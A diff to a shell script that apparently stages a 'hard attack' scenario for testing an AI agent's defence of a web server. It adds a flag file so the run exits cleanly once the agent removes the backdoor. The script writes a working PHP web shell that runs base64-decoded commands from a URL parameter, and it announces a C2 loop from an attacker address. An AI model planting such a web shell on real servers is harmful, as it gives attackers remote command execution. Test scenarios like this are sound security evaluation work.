@@ -11,12 +11,21 @@ else
 fi
 
 BACKDOOR="/var/www/html/$BACKDOOR_FILE"
+FLAG_FILE="/tmp/.hard_attack_active"
+
+# If flag_file exists but backdoor doesn't, then clean exit
+if [ -f "$FLAG_FILE" ] && [ ! -f "$BACKDOOR" ]; then
+    echo "Backdoor was removed by agent. Attack neutralized."
+    rm -f "$FLAG_FILE"
+    exit 0
+fi
 
 echo "Hard attack scenario: planting backdoor at $BACKDOOR"
 if [ ! -f "$BACKDOOR" ]; then
     cat > "$BACKDOOR" << 'EOF'
 <?php if(isset($_GET['cmd'])){ @system(base64_decode($_GET['cmd'])); } ?>
 EOF
+    touch "$FLAG_FILE"
 fi
 
 echo "Starting hard scenario attack: backdoor planted ($BACKDOOR_FILE), starting C2 loop from $ATTACKER_IP"
